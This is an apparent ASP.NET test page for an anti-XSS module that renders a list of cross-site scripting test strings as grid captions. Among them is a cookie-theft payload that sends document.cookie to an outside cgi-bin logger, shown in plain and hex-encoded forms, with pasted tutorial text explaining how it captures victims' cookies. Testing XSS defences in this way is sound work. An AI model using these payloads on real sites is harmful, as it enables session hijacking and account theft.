using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Xml.Linq;

namespace TestAntiXssModule
{
    public partial class GridTest : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            verifyhtmlattribute();
        }
        private string[] ShiftJSGetInputString(int i)
        {
            string[] returnInput = new string[]
               {
                   "<script type='text/javascript'>alert('XSS');</script>",
                   null,
                   "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._",//64 safe characters
                   "<a><script type='text/javascript'>alert('XSS');</script>XSS</a>", //64 characters with 25% encodings
                   "<a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a>",//128 characters with 25% encodings
                   "<a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a>",//512 characters with 25% encodings
                   "<a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a><a><script type='text/javascript'>alert('XSS');</script>XSS</a>",//1024 characters with 25% encodings
                   "~!@#$%^&*()_+=-`,./?><;'\":[]|}{~!@#$%^&*()_+=-`,./?><;'\":[]|}{",//64 characters with 100% encodings
                   "\uFB66\uFB65\uFB56\uFB59\uFB5A\uFB5B\uFB5C\uFB66\uFB65\uFB56\uFB59\uFB5A\uFB5B\uFB5C\uFB66\uFB65\uFB56\uFB59\uFB5A\uFB5B",//unicode characters
                   "北京奥运完美谢幕 罗格称赞无以伦比",//international characters
                   "<あ>",
                   "世界您好！ “ ”",
                   "Bonjour le monde! <>",
                   "नमस्ते विश्व! <>",
                   "こんにちは世界！ < >",
                   "U+180E", 
                    "<scr[U+FEFF]ipt>",
                    "<41 C2 C3 B1 42>",
                    "σ",
                    "′", 
                    "<a href=#[U+180E]onclick=alert()>",
                    "U+2002",
                    "U+205F",
                    "U+3000",
                    "U+180E",
                    "U+1680",
                    "http://host/a.php?variable="+'"'+ "><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi? '%20+document.cookie</script>",
                    "ASCII Usage: http://host/a.php?variable="+"> Hex Usage: http://host/a.php?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f %63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67 %69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f %6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e NOTE: The request is first shown in ASCII, then in Hex for copy and paste purposes. 1. "+"> HEX %22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e %6c%6f%63%61%74%69%6f%6e%3d%27 %68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65 %63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69 %2d%62%69%6e%2f %63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f %6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e 2. HEX %3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f %63%61%74%69%6f%6e%3d%27%68%74%74 %70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72 %69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e %2f%63%6f%6f%6b %69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c %2f%73%63%72%69%70%74%3e 3. > HEX %3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c %6f%63%61%74%69%6f%6e%3d%27%68%74 %74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75 %72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69 %6e%2f%63%6f%6f %6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65 %3c%2f%73%63%72%69%70%74%3e These are the examples of "+"evil"+" Javascript we will be using. These Javascript examples gather the users cookie and then send a request to the cgisecurity.com website with the cookie in the query. My script on cgisecurity.com logs each request and each cookie. In simple terms it is doing the following: My cookie = user=zeno; id=021 My script = www.cgisecurity.com/cgi-bin/cookie.cgi It sends a request to my site that looks like this. GET /cgi-bin/cookie.cgi?user=zeno;%20id=021 (Note: %20 is a hex encoding for a space) This is a primitive but effective way of grabbing a user's cookie. Logs of the use of this public script can be found at www.cgisecurity.com/articles/cookie-theft.log",
                    "<FORM><INPUT type="+"button"+ "value="+"New Window!"+" onClick="+"window.open('http://www.pageresource.com/jscript/jex5.htm','mywindow','width=400,height=200')"+"> </FORM>"

               };
            return returnInput;
        }
        public void verifyhtmlattribute()
        {
            int count = 28;
            string[] inputArray = new string[count];
            BaseDataList[] ItemsGrid = new DataGrid[count + 1]; // DataList();
            for (int i = 0; i <= count; i++)
            {
                inputArray = ShiftJSGetInputString(i);
                ItemsGrid[i] = new DataGrid();
                ItemsGrid[i].DataSource = CreateDataSource();
                ItemsGrid[i].DataBind();
                ItemsGrid[i].Caption = inputArray[i];
                ItemsGrid[i].Visible = true;
                ItemsGrid[i].GridLines = GridLines.Horizontal;
                ItemsGrid[i].BackColor = System.Drawing.Color.Blue;
                ItemsGrid[i].Height = 100;
                ItemsGrid[i].Width = 200;
                Panel1.Controls.Add(ItemsGrid[i]);
            }
        }

        ICollection CreateDataSource()
        {
            DataTable dt = new DataTable();
            DataRow dr;

            dt.Columns.Add(new DataColumn("IntegerValue", typeof(Int32)));
            for (int i = 0; i < 1; i++)
            {
                dr = dt.NewRow();

                dr[0] = i;
                dt.Rows.Add(dr);
            }

            DataView dv = new DataView(dt);
            return dv;
        }

    }
}
